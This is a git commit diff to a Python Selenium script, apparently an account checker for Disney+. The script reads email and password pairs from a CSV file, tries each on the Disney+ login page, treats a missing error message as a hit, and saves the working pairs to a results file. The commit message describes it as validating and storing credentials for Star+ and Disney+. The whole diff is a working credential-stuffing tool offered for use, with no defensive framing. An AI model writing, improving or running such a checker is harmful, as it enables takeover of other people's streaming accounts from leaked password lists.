f4878dfd0eead6c159cd1956a3a2b43d1f1213a5
frankmiller-crypto <onker.fc@gmail.com>
2023-11-27 10:34:31 -0600

    Se agrega nuevos features de validacion y guardado de credenciales de .txt en un starplus y disneyplus

--- scripts/login-disneyplus.py
+++ scripts/login-disneyplus.py
@@ -1,38 +1,66 @@
 import os.path
 import csv
-import requests
 from selenium import webdriver
 import time
 from selenium.webdriver.common.by import By
-from selenium.common.exceptions import NoSuchElementException
+from selenium.common.exceptions import NoSuchElementException, WebDriverException
 
-with open('csv/data_disneyplus.csv', 'r') as csv_file:
-    csv_reader = csv.reader(csv_file)
+def iniciar_sesion(usuario, contrasena, credenciales_validas):
+    try:
+        driver = webdriver.Chrome()
+        driver.maximize_window()
 
-    for line in csv_reader:
-        try:
-            driver = webdriver.Chrome()
-            driver.maximize_window()
+        driver.get('https://www.disneyplus.com/es-419/login')
 
-            driver.get('https://www.disneyplus.com/es-419/login')
+        time.sleep(5)
+        username_field = driver.find_element(By.NAME, 'email')
+        username_field.send_keys(usuario)
 
-            time.sleep(5)
-            username_field = driver.find_element(By.NAME, 'email')
-            username_field.send_keys(line[0])
+        submit = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/div[2]/button')
+        submit.click()
+        time.sleep(2)
 
-            submit = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/div[2]/button')
-            submit.click()
-            time.sleep(2)
+        password_field = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/fieldset[2]/span/input')
+        password_field.send_keys(contrasena)
 
-            password_field = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/fieldset[2]/span/input')
-            password_field.send_keys(line[1])
+        submit = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/div/button')
+        submit.click()
+        time.sleep(3)
+        
+        # Busca el mensaje de error en el contenido de la página
+        page_content = driver.page_source
+        if "Ocurrió un error al iniciar sesión" not in page_content:
+            print(f"Las credenciales {usuario}, {contrasena} funcionan correctamente")
+            credenciales_validas.append((usuario, contrasena))
+    except NoSuchElementException:
+        print(f"Las credenciales {usuario}, {contrasena} no funcionan... Intentando con el siguiente conjunto.")
+    except WebDriverException as e:
+        print(f"Hubo un problema al intentar iniciar sesión con {usuario}, {contrasena}: {str(e)}")
+    except Exception as e:
+        # Imprime el mensaje de error específico si lo hay
+        print(str(e))
+    finally:
+        # Cerrar el navegador en cualquier caso
+        driver.quit()
 
-            submit = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/div/button')
-            submit.click()
-            time.sleep(2)
-            print(f"Las credenciales {line} , funcionan correctamente")
-        except NoSuchElementException:
-            print(f"Las credenciales {line} no funcionan... Intentando con el siguiente conjunto.")
-        finally:
-            # Cerrar el navegador en cualquier caso
-            driver.quit()
+# Lee las credenciales desde el archivo CSV
+csv_file_path = 'csv/data_disneyplus.csv'
+credenciales_validas = []
+
+if os.path.isfile(csv_file_path):
+    with open(csv_file_path, 'r') as csv_file:
+        csv_reader = csv.reader(csv_file)
+
+        for line in csv_reader:
+            usuario = line[0]
+            contrasena = line[1]
+
+            iniciar_sesion(usuario, contrasena, credenciales_validas)
+
+# Guarda las credenciales válidas en un archivo .txt
+if credenciales_validas:
+    with open('results/credenciales_validas_disneyplus.txt', 'w') as txt_file:
+        for credencial in credenciales_validas:
+            txt_file.write(f"{credencial[0]},{credencial[1]}\n")
+
+print("Credenciales validas guardadas en 'results/credenciales_validas_disneyplus.txt'")
